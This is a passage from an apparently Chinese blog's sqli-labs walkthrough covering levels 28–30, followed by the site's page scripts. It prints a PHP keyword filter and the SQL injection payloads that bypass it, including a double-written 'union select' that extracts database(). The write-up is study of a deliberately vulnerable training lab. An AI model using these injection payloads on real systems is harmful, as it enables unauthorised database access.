+//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[\/\*]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);	//strip out /*
+//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[--]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		//Strip out --.
+//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[#]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);		//Strip out <span class="hljs-comment">#.</span>
+//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);	    	//Strip out spaces.
+//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/select/m'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);	   //Strip out spaces.
+//<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);	    	//Strip out spaces.
+<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">'/union\s+select/i'</span>,<span class="hljs-string">""</span>, <span class="hljs-variable">$id</span>);	    //Strip out spaces.
+<span class="hljs-built_in">return</span> <span class="hljs-variable">$id</span>;
+&#125;</code></pre></p>
+<p>直接双写<code>union select</code><br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>') uniounion selectn select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> and ('<span class="hljs-number">1</span>'='<span class="hljs-number">1</span></code></pre></p>
+<h5 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关"></a>第二十九关</h5><p><b style="font-size: 30px">emmm……</b><br><img src="/img/2018-08-17/9.png" srcset="/img/static/loading.gif" alt="9"><br>“This site protected by world’s best Firewall”,really？。感觉一点过滤都没有。。。</p>
+<h5 id="第三十关"><a href="#第三十关" class="headerlink" title="第三十关"></a>第三十关</h5><p>感觉和第二十九关一样<br><pre><code class="hljs undefined">id=<span class="hljs-number">0</span><span class="hljs-string">" union select 1,database(),3 and "</span><span class="hljs-number">1</span><span class="hljs-string">"="</span><span class="hljs-number">1</span></code></pre></p>
+<div style="text-align: center"><br><b style="font-size: 30px;">卒</b><br></div>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/注入/">注入</a>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/盲注/">盲注</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/08/21/wangdingbei/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">网鼎杯writeup（复现）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/08/03/sqli-labs2/">
+                        <span class="hidden-mobile">sqli-labs的学习记录二（9-22）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz",
+          app_key: "i3vUWkHRRkiiS7LuUpuIm1E5",
+          placeholder: "说些什么",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "sRx9dQVqzL65gdhuYexJtTPF",
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" rel="nofollow noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+  <div class="statistics">
+    
+    
+    <i class="iconfont icon-users"></i>
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      <i class="iconfont icon-friends"></i>
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+    
+      
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-codeforces"></i>
+        全站共计:31.9k 字
+      </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer>
+  (function () {
+    // 查询存储的记录
+    function getRecord(Counter, target) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({target})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {target, time: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    }
+
+    // 发起自增请求
+    function increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    }
+
+    // 构建自增请求体
+    function buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "time": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    }
+
+    // 校验是否为有效的 UV
+    function validUV() {
+      var key = 'LeanCloud_UV_Flag';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    }
+
+    function addCount(Counter) {
+      var enableIncr = 'true' === 'true' && window.location.hostname !== 'localhost';
+      var getterArr = [];
+      var incrArr = [];
+
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#leancloud-site-pv-container');
+      if (pvCtn || enableIncr) {
+        var pvGetter = getRecord(Counter, 'site-pv').then((record) => {
+          incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-pv');
+          if (ele) {
+            ele.innerText = record.time + 1;
+            if (pvCtn) {
+              pvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#leancloud-site-uv-container');
+      if (uvCtn || enableIncr) {
+        var uvGetter = getRecord(Counter, 'site-uv').then((record) => {
+          var vuv = validUV();
+          vuv && incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-uv');
+          if (ele) {
+            ele.innerText = record.time + (vuv ? 1 : 0);
+            if (uvCtn) {
+              uvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 如果是文章，请求文章的浏览数，并自增
+      if ('true' === 'true') {
+        var viewCtn = document.querySelector('#leancloud-post-views-container');
+        if (viewCtn || enableIncr) {
+          var target = decodeURI('/2018/08/17/sqli-labs3/');
+          var viewGetter = getRecord(Counter, target).then((record) => {
+            incrArr.push(buildIncrement(record.objectId))
+            if (viewCtn) {
+              var ele = document.querySelector('#leancloud-post-views');
+              if (ele) {
+                ele.innerText = (record.time || 0) + 1;
+                viewCtn.style.display = 'inline';
+              }
+            }
+          });
+          getterArr.push(viewGetter);
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && increment(Counter, incrArr);
+        })
+      }
+    }
+
+    var app_id = '3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz'
+    var app_key = 'neatHwvRMvcDYnNxMBbGGFlP'
+    var server_url = 'https://3vytx5qf.lc-cn-n1-shared.com'
+
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': app_id,
+            'X-LC-Key': app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+
+      addCount(Counter);
+    }
+
+    var api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${ app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(resp => resp.json())
+        .then(({api_server}) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    function typing(id, hitokoto){
+      var typed = new Typed('#' + id, {
+        strings: [
+          '  ',
+          hitokoto + "&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        loop: false,
+      });
+      typed.stop();
+      $(document).ready(function () {
+        $(".typed-cursor").addClass("h2");
+        typed.start();
+      });
+    };
+      
+  
+    typing("subtitle", "sqli-labs的学习记录三（23-30）")
+  
+  </script>
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
